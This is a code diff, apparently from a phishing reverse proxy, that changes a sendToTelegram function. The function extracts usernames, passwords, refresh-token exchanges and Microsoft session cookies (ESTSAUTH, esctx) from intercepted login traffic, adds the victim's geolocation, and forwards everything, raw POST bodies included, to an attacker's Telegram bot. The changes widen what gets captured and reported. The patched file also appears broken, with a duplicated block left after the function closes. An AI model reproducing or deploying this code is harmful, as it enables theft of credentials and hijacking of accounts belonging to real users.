@@ -123,59 +123,112 @@ async function sendToTelegram(data) {
         let isTokenExchange = false;
         
         if (body) {
-    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
-    
-    console.log('📦 Raw body (first 500 chars):', bodyStr.slice(0, 500));
-    
-    // ── PATTERN 1: URL-encoded form data ──
-    const userMatch = bodyStr.match(/(?:login|loginfmt|username)=([^&]+)/i);
-    if (userMatch) {
-        username = decodeURIComponent(userMatch[1]);
-    }
-    
-    const passMatch = bodyStr.match(/(?:passwd|password|pass)=([^&]+)/i);
-    if (passMatch) {
-        password = decodeURIComponent(passMatch[1]);
-        hasCredentials = true;
-        console.log('✅ PASSWORD FOUND (URL-encoded):', password);
-    }
-    
-    // ── PATTERN 2: JSON format (Microsoft uses this!) ──
-    try {
-        const jsonBody = typeof body === 'string' ? JSON.parse(body) : body;
-        if (jsonBody.password) {
-            password = jsonBody.password;
-            hasCredentials = true;
-            console.log('✅ PASSWORD FOUND (JSON):', password);
+            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+            console.log('📦 Raw body (first 500 chars):', bodyStr.slice(0, 500));
+            
+            // ── PATTERN 1: URL-encoded form data ──
+            const userMatch = bodyStr.match(/(?:login|loginfmt|username)=([^&]+)/i);
+            if (userMatch) {
+                username = decodeURIComponent(userMatch[1]);
+                // If we have a username but no password yet, don't set hasCredentials
+                // Wait for the password request
+            }
+            
+            const passMatch = bodyStr.match(/(?:passwd|password|pass)=([^&]+)/i);
+            if (passMatch) {
+                password = decodeURIComponent(passMatch[1]);
+                hasCredentials = true;
+                console.log('✅ PASSWORD FOUND (URL-encoded):', password);
+            }
+            
+            // ── PATTERN 2: JSON format ──
+            try {
+                const jsonBody = typeof body === 'string' ? JSON.parse(body) : body;
+                if (jsonBody.password) {
+                    password = jsonBody.password;
+                    hasCredentials = true;
+                    console.log('✅ PASSWORD FOUND (JSON):', password);
+                }
+                if (jsonBody.username) {
+                    username = jsonBody.username;
+                }
+                if (jsonBody.loginfmt) {
+                    username = jsonBody.loginfmt;
+                }
+            } catch (e) {
+                // Not JSON, continue
+            }
+            
+            // ── PATTERN 3: Raw string fallback ──
+            if (!hasCredentials && bodyStr.includes('password')) {
+                const rawPassMatch = bodyStr.match(/"password"\s*[:=]\s*"([^"]+)"/i) ||
+                                    bodyStr.match(/password['"]?\s*[:=]\s*['"]?([^'"]+)['"]?/i);
+                if (rawPassMatch) {
+                    password = rawPassMatch[1];
+                    hasCredentials = true;
+                    console.log('✅ PASSWORD FOUND (raw):', password);
+                }
+            }
+            
+            // ── PATTERN 4: Token exchange ──
+            if (bodyStr.includes('refresh_token') && bodyStr.includes('grant_type')) {
+                isTokenExchange = true;
+                hasCredentials = true;
+                console.log('✅ TOKEN EXCHANGE DETECTED');
+            }
+            
+            // ── PATTERN 5: CHECK FOR ANY POST DATA (for debugging) ──
+            if (bodyStr.length > 10) {
+                console.log('📤 POST data detected, length:', bodyStr.length);
+                // If we have a username but no password, we should still log the visit
+                if (username !== 'N/A' && !hasCredentials) {
+                    console.log('📝 Username found but no password yet - this is the first step');
+                    // We'll still send a notification but mark it as "Username Only"
+                }
+            }
         }
-        if (jsonBody.username) {
-            username = jsonBody.username;
+        
+        // ────── CHECK FOR SESSION COOKIE ──────
+        const setCookieHeaders = data.proxyResponseHeaders?.['set-cookie'];
+        if (setCookieHeaders) {
+            const cookieStr = JSON.stringify(setCookieHeaders);
+            if (cookieStr.includes('esctx') || 
+                cookieStr.includes('ESTSAUTH') || 
+                cookieStr.includes('LoginOptions')) {
+                isSessionCookie = true;
+                hasCredentials = true;
+                console.log('✅ SESSION COOKIE DETECTED');
+            }
         }
-        if (jsonBody.loginfmt) {
-            username = jsonBody.loginfmt;
+        
+        // ────── SEND NOTIFICATION IF WE HAVE USERNAME OR COOKIE ──────
+        // Even if no password yet, we should send a notification for the username
+        if (username !== 'N/A' || hasCredentials || isSessionCookie) {
+            hasCredentials = true; // Force send if we have at least a username
+            console.log('✅ Sending notification for username/cookie');
         }
-    } catch (e) {
-        // Not JSON, continue
-    }
-    
-    // ── PATTERN 3: Raw string fallback ──
-    if (!hasCredentials && bodyStr.includes('password')) {
-        const rawPassMatch = bodyStr.match(/"password"\s*[:=]\s*"([^"]+)"/i) ||
-                            bodyStr.match(/password['"]?\s*[:=]\s*['"]?([^'"]+)['"]?/i);
-        if (rawPassMatch) {
-            password = rawPassMatch[1];
-            hasCredentials = true;
-            console.log('✅ PASSWORD FOUND (raw):', password);
+        
+        // ────── SKIP IF NOTHING VALUABLE ──────
+        if (!hasCredentials) {
+            console.log('⏭️ Skipping notification - no credentials found in:', url);
+            return;
         }
-    }
-    
-    // ── PATTERN 4: Token exchange ──
-    if (bodyStr.includes('refresh_token') && bodyStr.includes('grant_type')) {
-        isTokenExchange = true;
-        hasCredentials = true;
-        console.log('✅ TOKEN EXCHANGE DETECTED');
-    }
-}
+        
+        console.log('✅ Valid credentials found, sending notification...');
+        NOTIFIED_SESSIONS.add(sessionId);
+        
+        // ────── GEO INFO ──────
+        let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
+        let flag = '🌍';
+        let location = 'Unknown';
+
+        if (ip !== 'Unknown') {
+            try {
+                geo = await getGeoInfo(ip);
+                flag = getFlagEmoji(geo.countryCode);
+                location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
+            } catch (e) {}
+        }
 
         // ────── BUILD MESSAGE ──────
         let message = `
@@ -203,6 +256,10 @@ ${flag} **Location:** ${location}
         if (password !== 'N/A') {
             message += `
 🔐 **Password:** ${password}
+            `;
+        } else {
+            message += `
+⚠️ **Password:** Not yet captured (waiting for second step)
             `;
         }
 
@@ -234,7 +291,7 @@ ${flag} **Location:** ${location}
             if (telegramError.response) {
                 console.error('   Response:', telegramError.response.data);
             }
-            throw telegramError; // Re-throw to trigger the outer catch
+            throw telegramError;
         }
 
         // ────── SEND COOKIES AS FILE ──────
@@ -247,6 +304,27 @@ ${flag} **Location:** ${location}
                 console.log('⚠️ Cookie file send failed:', e.message);
             }
         }
+
+        // ────── SEND RAW DATA FOR DEBUGGING ──────
+        if (body && typeof body === 'string' && body.length > 0 && body.length < 4000) {
+            try {
+                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    chat_id: CHAT_ID,
+                    text: `📦 **Raw POST Data:**\n\`\`\`\n${body.slice(0, 3000)}\n\`\`\``,
+                    parse_mode: 'Markdown'
+                });
+                console.log('✅ Raw data sent successfully');
+            } catch (e) {
+                console.log('⚠️ Raw data send failed:', e.message);
+            }
+        }
+
+    } catch (e) {
+        console.error('❌ sendToTelegram() FAILED:', e.message);
+        console.error('   Stack:', e.stack);
+        NOTIFIED_SESSIONS.delete(sessionId);
+    }
+}
 
         // ────── SEND RAW DATA (FOR DEBUGGING) ──────
         if (body && typeof body === 'string' && body.length > 0 && body.length < 4000) {
